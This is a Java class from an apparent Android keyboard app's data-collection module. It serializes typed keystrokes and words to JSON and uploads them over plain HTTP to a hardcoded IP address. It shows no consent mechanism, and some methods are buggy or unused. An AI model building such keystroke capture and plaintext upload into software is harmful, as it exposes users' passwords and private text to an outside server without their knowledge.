package com.anysoftkeyboard.datacollection;


import android.content.Context;
import android.net.TrafficStats;
import android.os.Build;
import android.support.annotation.RequiresApi;

import com.anysoftkeyboard.base.utils.Logger;
import com.anysoftkeyboard.datacollection.database.dao.FileInfoDao;
import com.anysoftkeyboard.datacollection.database.model.FileInfo;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.net.ConnectException;
import java.net.SocketTimeoutException;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.TimeUnit;


import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import static com.anysoftkeyboard.base.Charsets.UTF8;

public class DataTransmitter implements Runnable {

    private Context context;
    private DataCollection dataCollection;
    private FileInfoDao fileInfoDao;

    public DataTransmitter(Context context, DataCollection dataCollection) {
        this.context = context;
        this.dataCollection = dataCollection;
        fileInfoDao = new FileInfoDao(context);
    }


    /**
     * This method save the data from DataCollection as file
     */
    @RequiresApi(api = Build.VERSION_CODES.O)
    private void saveData(FileInfo fileInfo) throws IOException {

        File file = new File(this.context.getFilesDir(), fileInfo.getFileName());
        BufferedWriter writer = Files.newBufferedWriter(file.toPath(), UTF8);
        writer.write(this.dataCollection.toJsonString());
        writer.close();

        //Test reading

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private String readData(FileInfo fileInfo) throws IOException {
        File file = new File(this.context.getFilesDir(), fileInfo.getFileName());
        BufferedReader reader = Files.newBufferedReader(file.toPath(), UTF8);
        String result = reader.readLine();
        Logger.d("test", "dc-- DataTransmitter read in string length=%d", reader.readLine().length());
        Logger.d("test", "dc-- DataTransmitter actual string length=%d", this.dataCollection.getKeystrokes().toString().length() + this.dataCollection.getWords().toString().length());
        reader.close();
        return result;
    }

    /**
     * This method perform the transmit file process, please refer the activity diagram of transmit file process
     */
    @Override
    @RequiresApi(api = Build.VERSION_CODES.O)
    public void run() {
        TrafficStats.setThreadStatsTag((int) Thread.currentThread().getId());
        transmitProcess();
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void transmitProcess() {
//        FileInfo fileInfo = new FileInfo(UUID.randomUUID().toString(), dataCollection.toString().length());

        try {
            uploadFile(dataCollection.toJsonString());

        }  catch (IOException e) {
            Logger.w(this.getClass().getName(), "dc-- DataTransmitter exception  m=%s", e.getClass());
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void uploadUnsentData() {
        fileInfoDao.open();
        List<FileInfo> unSentList = fileInfoDao.findAllFileInfoByHasSent(false);
        Logger.d(this.getClass().getName(), "dc-- DataTransmitter unsent data size = %d", unSentList.size());

        for (FileInfo fileInfo : unSentList) {
            try {
                String data = readData(fileInfo);
                Logger.d(this.getClass().getName(), "dc-- DataTransmitter read data");
                uploadFile(data);
                Logger.d(this.getClass().getName(), "dc-- DataTransmitter upload data");
                deleteFile(fileInfo);
                Logger.d(this.getClass().getName(), "dc-- DataTransmitter delete file=%s", fileInfo.getFileName());
                fileInfoDao.deleteFileInfo(fileInfo);
                Logger.d(this.getClass().getName(), "dc-- DataTransmitter delete file=%s in database", fileInfo.getFileName());

            } catch (ConnectException e) {
                Logger.w(this.getClass().getName(), "dc-- DataTransmitter cannot upload the file=%s", e.getClass());
                break;

            } catch (IOException e) {
                Logger.w(this.getClass().getName(), "dc-- DataTransmitter cannot read the file=%s", e.getClass());
            }

        }

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private void noConnectionProcess(FileInfo fileInfo) {
        Logger.d(this.getClass().getName(), "dc-- DataTransmitter in no connectionProcess ");
        try {
            //save the file and insert file information into database
            saveData(fileInfo);
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file saved");
            fileInfoDao.open();
            fileInfoDao.insert(fileInfo);
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter file has not been sent = %d", fileInfoDao.findAllFileInfoByHasSent(false).size());
            fileInfoDao.close();


        } catch (Exception e) {
            Logger.w(this.getClass().getName(), "dc-- DataTransmitter fail to save file m=%s", e.getClass());
        }

    }


    /**
     * Upload the file to backend server
     *
     * @param jsonData
     * @throws IOException
     */
    private void uploadFile(String jsonData) throws IOException {
        RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), jsonData);
        Request request = new Request.Builder().url("http://52.170.32.197/saveKeyboard").post(body).build();
        OkHttpClient client = new OkHttpClient.Builder().connectTimeout(5, TimeUnit.SECONDS).writeTimeout(5, TimeUnit.SECONDS).readTimeout(5, TimeUnit.SECONDS).build();
        Logger.d(this.getClass().getName(), "dc-- DataTransmitter in file upload try block");

        try {
           client.newCall(request).execute();

        } catch (SocketTimeoutException e) {
            Logger.d(this.getClass().getName(), "dc-- DataTransmitter socket timeout is fine");
        }


    }


    /**
     * delete the file on disk. return true if delete success
     *
     * @param fileInfo file information
     * @return return true if delete success
     * *
     */
    private boolean deleteFile(FileInfo fileInfo) {
        File file = new File(this.context.getFilesDir(), fileInfo.getFileName());
        return file.delete();
    }


}
